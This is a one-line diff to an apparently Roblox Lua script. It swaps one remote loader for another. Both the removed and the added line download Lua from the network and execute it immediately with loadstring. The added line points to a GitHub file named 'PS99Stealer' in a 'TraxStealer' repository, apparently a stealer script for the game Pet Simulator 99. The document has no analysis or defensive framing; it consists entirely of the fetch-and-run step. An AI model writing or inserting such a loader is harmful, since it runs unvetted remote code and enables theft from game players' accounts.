@@ -1,1 +1,1 @@
-loadstring(game:HttpGet('https://darkscripts.space/scripts/e882c958-bc28-4f41-96f2-408e42698b10_770240539429175317.lua',true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/TraxStealer/refs/heads/main/PS99Stealer", true))()
